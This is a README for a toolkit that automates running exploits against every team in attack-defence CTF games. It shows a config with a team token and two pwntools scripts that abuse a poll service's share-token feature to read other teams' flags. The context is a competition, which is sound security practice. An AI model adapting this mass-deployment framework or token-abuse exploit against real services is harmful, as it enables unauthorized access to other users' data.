# A collection of scripts to simplify testing and deploying attacks in attack-defence CTFs
All you need to do is write the exploit for a single target! `test_attack` will 
help you check that everything works as intended. Before every game tick, `deploy` dinamically loads the configuration and any new exploits. Easy to configure through `config.py`, with a dedicated process for every type of attack and in that process a thread for each target.

## Requirements
- `docker compose` for simple MongoDB setup. Alternatively, you can host the database yourself.
- `pip install -r requirements.txt`

## Configuration
At the start of the challenge, remember to properly edit `config.py` 
```python
log_level = "info" # can be debug, info, warn, error
team_id = 77
highest_id = 86
TEAM_TOKEN = "b0d9d5b0307be878aa00e935e230d2d"
max_time = 60 # every thread (attack against a single target) gets at most max_time seconds, after which it's stopped and a warning is printed
tick_duration = 120 # how long is every game tick in seconds
flag_regex = "[A-Z0-9]{31}="
baseip = "10.60.{id}.1"
db_url = "mongodb://localhost:27017/"
```

## Usage
1. Build the database and start deploy.py
```sh
git clone https://github.com/parmigggiana/attack_scripts.git
cd attack_scripts
docker compose up --build -d && python3 deploy.py 
```

2. Edit the `exploit` function inside `test_attack.py`.
You can use the following decorators:
- `@local_test` to attack localhost
- `@nop_test` to attack the nop_team
- `@self_test` to attack your team_ip

2. Copy your `exploit()` and all auxiliary functions to a new file inside `config/exploits/`.
Give it a meaningful name and make sure the file and the exploit function 
have the same name. You can take a look at `config/exploits/example.py` for a reference.

3. Make sure to only keep
the necessary `log.info` and remove all `print`. Consider
switching them to `log.debug`. The console is gonna get busy! 
Edit every function printing to stdout so that it is surrounded by `l.acquire()` and `l.release()` (This is not essential, but with this many parallel processes and threads the sometimes print on the same line. It keeps the output tidy). 

4. Done! If `deploy.py` is already running it will automatically load all new exploits before the next game tick (but don't forget to save the files lmao).

## Examples
File `test_attack.py` 
```python
import json
import requests
import uuid
from pwn import remote, log

from ctf_suite import local_test


@local_test
def exploit(target_ip):
    def get_polls_dict():
        flag_ids_url = "http://10.10.0.1:8081/flagIds"

        res = requests.get(flag_ids_url)
        # print(res.text)
        victims_dict = res.json()["Polls"]
        victim_polls = victims_dict[str(target_ip)]
        return victims_dict

    log.info(f"{__name__} against {target_ip}!")

    try:
        p = remote(target_ip, 5000)
    except:
        log.debug(f"{target_ip}'s service is down!")
        return []

    flags = []
    p.recvuntil(b"]: ")
    p.sendline(b"register")
    p.sendlineafter(b"username: ", uuid.uuid4().hex.encode("ascii"))
    p.sendlineafter(b"password: ", uuid.uuid4().hex.encode("ascii"))
    p.recv(timeout=0.5)

    for poll in get_polls_dict():
        poll = json.loads(poll)
        poll_id = poll["poll_id"]
        username = poll["username"]
        log.debug(f"{poll_id = }, {username = }")

        p.sendline(b"access poll")
        p.sendlineafter(b"back): ", b"share")
        p.recv(timeout=0.5)
        p.sendline(poll_id.encode("ascii"))
        data = p.recv(timeout=0.5)
        if "not" in str(data):
            log.debug(f"{target_ip} patched this vulnerability!")
            break

        token = str(data).split(": ")[1][:-3]
        log.debug(f"{token = }")
        p.sendlineafter(b"exit]: ", b"use token")
        p.sendlineafter(b"Token: ", token)
        p.sendlineafter(b"exit]: ", b"access poll")
        p.sendlineafter(b"back): ", b"show")
        p.sendlineafter(b"id: ", poll_id)

        data = p.recv(timeout=0.5)
        flag = str(data).split(", ")[0]
        flag = str.replace(flag, "\\n", "")
        flag = str.replace(flag, " ", "")

        flags.append(flag[2:])

    log.success(f"{flags}")
    return flags

def main():
    exploit()  # type: ignore


if __name__ == "__main__":
    main()
```
After we get this working, we create a new file `config/exploits/share.py`
```python
import json
import requests
import uuid
from pwn import remote, log

from .common import stdout_lock as l


def share(target_ip):
    def get_polls_dict():
        flag_ids_url = "http://10.10.0.1:8081/flagIds"

        res = requests.get(flag_ids_url)
        # print(res.text)
        victims_dict = res.json()["Polls"]
        victim_polls = victims_dict[str(target_ip)]
        return victims_dict

    l.acquire()
    log.debug(f"{__name__} against {target_ip}!")
    l.release()
    try:
        p = remote(target_ip, 5000)
    except:
        l.acquire()
        log.debug(f"{target_ip}'s service is down!")
        l.release()
        return []

    flags = []
    p.recvuntil(b"]: ")
    p.sendline(b"register")
    p.sendlineafter(b"username: ", uuid.uuid4().hex.encode("ascii"))
    p.sendlineafter(b"password: ", uuid.uuid4().hex.encode("ascii"))
    p.recv(timeout=0.5)

    for poll in get_polls_dict():
        poll = json.loads(poll)
        poll_id = poll["poll_id"]
        username = poll["username"]
        l.acquire()
        log.debug(f"{poll_id = }, {username = }")
        l.release()

        p.sendline(b"access poll")
        p.sendlineafter(b"back): ", b"share")
        p.recv(timeout=0.5)
        p.sendline(poll_id.encode("ascii"))
        data = p.recv(timeout=0.5)
        if "not" in str(data):
            l.acquire()
            log.debug(f"{target_ip} patched this vulnerability!")
            l.release()
            return []

        token = str(data).split(": ")[1][:-3]
        l.acquire()
        log.debug(f"{token = }")
        l.release()
        p.sendlineafter(b"exit]: ", b"use token")
        p.sendlineafter(b"Token: ", token)
        p.sendlineafter(b"exit]: ", b"access poll")
        p.sendlineafter(b"back): ", b"show")
        p.sendlineafter(b"id: ", poll_id)

        data = p.recv(timeout=0.5)
        flag = str(data).split(", ")[0]
        flag = str.replace(flag, "\\n", "")
        flag = str.replace(flag, " ", "")

        flags.append(flag[2:])
    l.acquire()
    log.success(f"{flags}")
    l.release()
    return flags
```

## TODO
- [] Add flag submission logic
- [] Fix live-updating configs and exploits
- []